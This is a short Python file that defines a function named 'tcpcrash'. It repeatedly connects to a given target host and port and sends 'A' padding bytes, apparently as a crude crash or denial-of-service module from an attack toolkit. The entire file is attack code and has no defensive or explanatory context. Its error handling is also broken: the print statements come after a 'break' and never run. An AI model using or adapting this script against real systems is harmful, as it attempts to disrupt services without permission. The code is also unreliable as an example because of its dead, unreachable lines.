import socket
import time

def tcpcrash(target, port):
   red = "\033[31m"
   blue = "\033[34m"
   bold = "\033[1m"
   reset = "\033[0m"
   green = "\033[32m"
   yellow = "\033[33m"
   for i in range(60):
      try:
         sock = socket.socket()
         sock.connect((target, port))
         sock.send(b'A' * 100)
         time.sleep(0.1)
      except Exception as err:
         break
         print(err)
         print(f"{red}[-]{reset} Module failed to run")